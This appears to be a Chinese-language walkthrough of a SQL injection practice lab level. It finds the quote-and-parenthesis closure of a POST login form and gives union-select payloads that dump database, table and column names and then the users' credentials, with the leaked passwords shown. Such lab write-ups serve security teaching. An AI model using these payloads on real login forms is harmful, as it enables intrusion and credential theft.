# 确认闭合状态
跟上题一样，使用post方式输入：passwd=1' or 1=1 --+&submit=Submit&uname=1  
失败

输入passwd=1" or 1=1 --+&submit=Submit&uname=1  
报错near '' at line 1

说明双引号是对的，但不完全对，我们添加括号试试

输入：passwd=1") or 1=1 --+&submit=Submit&uname=1
正常回显

说明该题是双引号加括号的闭合形式

剩下payload与11关一致
 # 查询数据库名
passwd=1") union select database(),2--+&submit=Submit&uname=1

# 查询表名
passwd=1") union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&submit=Submit&uname=1

# 查询列名
passwd=1") union select group_concat(column_name),2 from information_schema.columns where table_name='users' and table_schema=database()--+&submit=Submit&uname=1

# 查询值
passwd=1") union select group_concat(username,':',password),2 from users--+&submit=Submit&uname=1

回显：  
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4  
Your Password:2